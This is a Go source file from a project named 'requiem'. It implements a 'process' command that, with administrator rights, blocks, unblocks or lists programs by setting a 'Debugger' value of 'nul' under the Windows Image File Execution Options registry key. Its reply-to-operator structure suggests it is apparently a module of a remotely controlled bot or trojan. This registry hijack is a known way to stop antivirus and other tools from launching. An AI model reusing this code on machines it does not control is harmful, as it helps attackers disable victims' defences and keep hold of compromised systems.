package commands

import (
	"fmt"
	"strings"

	"requiem/store"
	"requiem/utils"

	"golang.org/x/sys/windows/registry"
)

const EXEC_OPTIONS = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"

func (*ProcCommand) Exec(ctx *store.CommandContext, args []string) {
	if !store.IsAdmin {
		ctx.ReplyMsg("🟥 Administrator privileges are required to do this.")
		return
	}

	if len(args) < 1 {
		ctx.ReplyMsg("🟥 You need to provide a flag.")
		return
	}

	content := strings.Join(args, " ")

	list := utils.HasFlag(content, "list")

	process := utils.UnwrapQuotes(content)
	if process == "" && !list {
		ctx.ReplyMsg("🟥 You need to wrap the process file name in double quotes.")
		return
	}

	if utils.HasFlag(content, "block") {
		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process, registry.SET_VALUE)
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to create key - %s", err))
			return
		}

		defer key.Close()

		err = key.SetStringValue("Debugger", "nul")
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to set hook value - %s", err))
			return
		}

		ctx.ReplyMsg("🟩 Successfully blocked process.")
		return
	}

	if utils.HasFlag(content, "unblock") {
		err := registry.DeleteKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process)
		if err == nil {
			ctx.ReplyMsg("🟩 Successfully unblocked process.")
			return
		}

		key, err := registry.OpenKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process, registry.SET_VALUE)
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to unblock process (1) - %s", err))
			return
		}

		defer key.Close()

		err = key.DeleteValue("Debugger")
		if err == nil {
			ctx.ReplyMsg("🟩 Successfully unblocked process.")
			return
		}

		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to unblock process (2) - %s", err))
		return
	}

	if list {
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, EXEC_OPTIONS, registry.READ)
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to open key - %s", err))
			return
		}

		defer key.Close()

		subs, err := key.ReadSubKeyNames(-1)
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to open sub keys - %s", err))
			return
		}

		var blocked []string

		for _, name := range subs {
			sub, err := registry.OpenKey(key, name, registry.READ)
			if err != nil {
				continue
			}

			val, _, err := sub.GetStringValue("Debugger")
			sub.Close()

			if err != nil {
				continue
			}

			if val != "nul" {
				continue
			}

			blocked = append(blocked, name)
		}

		if len(blocked) == 0 {
			ctx.ReplyMsg("There are no blocked processes.")
			return
		}

		ctx.ReplyMsg("Blocked processes:\n```\n" + strings.Join(blocked, "\n") + "```")
		return
	}

	ctx.ReplyMsg("🟥 Invalid flag.")
}

func (*ProcCommand) Name() string {
	return "process"
}

func (*ProcCommand) Info() string {
	return "Block or unblock processes."
}

type ProcCommand struct{}
